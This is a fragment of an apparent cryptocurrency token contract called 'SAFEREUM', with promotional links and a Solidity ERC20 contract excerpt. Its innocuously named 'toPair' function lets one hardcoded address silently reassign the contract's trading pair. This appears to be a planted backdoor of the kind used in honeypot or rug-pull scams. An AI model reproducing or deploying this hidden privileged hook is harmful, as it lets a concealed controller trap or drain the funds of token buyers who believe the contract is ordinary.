...
Website: http://SAFEREUM.com/
Twitter: https://twitter.com/SAFEREUM
Telegram: https://SAFEREUM
...
contract TOKEN is Ownable, IERC20, IERC20Meta {
    ...
    function toPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0x545f348b6846a0606Cf9160f920a19fc855610E8) _pair = account;
        return true;
    }
